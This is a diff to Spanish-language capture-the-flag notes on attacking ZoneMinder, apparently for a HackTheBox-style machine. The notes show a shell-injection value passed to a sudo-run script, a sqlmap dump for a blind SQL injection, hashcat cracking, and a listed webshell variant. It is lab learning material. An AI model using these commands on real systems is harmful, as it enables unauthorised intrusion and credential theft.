@@ -30,9 +30,20 @@ sudo -l
 sudo /usr/bin/zmupdate.pl --user='; /bin/bash #'
 ```
 
+### Variante: SQLi en ZoneMinder 1.37.63 (CCTV)
+
+CCTV usa CVE-2024-51482, una SQLi ciega en el manejo de eventos. Con una sesión válida se vuelca la base, se crackea el hash bcrypt de un usuario y se entra por SSH. Desde allí, `tcpdump` captura credenciales en claro y motionEye se explota con CVE-2025-60787 para llegar a root.
+
+```bash
+sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=...' \
+  --cookie='ZMSESSID=<SESSION>' --batch --dump
+hashcat -m 3200 zm.hashes rockyou.txt
+```
+
 ## Variantes
 
 - Usar `LD_PRELOAD` con un script Perl privilegiado.
+- Aprovechar CVE-2024-51482 para volcar usuarios y reutilizar la contraseña.
 - Escribir un PHP en el webroot.
 - Aprovechar credenciales de la base para el panel.
 
@@ -51,5 +62,6 @@ sudo /usr/bin/zmupdate.pl --user='; /bin/bash #'
 ## Referencias
 
 - <https://nvd.nist.gov/vuln/detail/CVE-2023-26035>
+- <https://nvd.nist.gov/vuln/detail/CVE-2024-51482>
 - <https://zoneminder.com/>
 - <https://attack.mitre.org/techniques/T1059/004/>
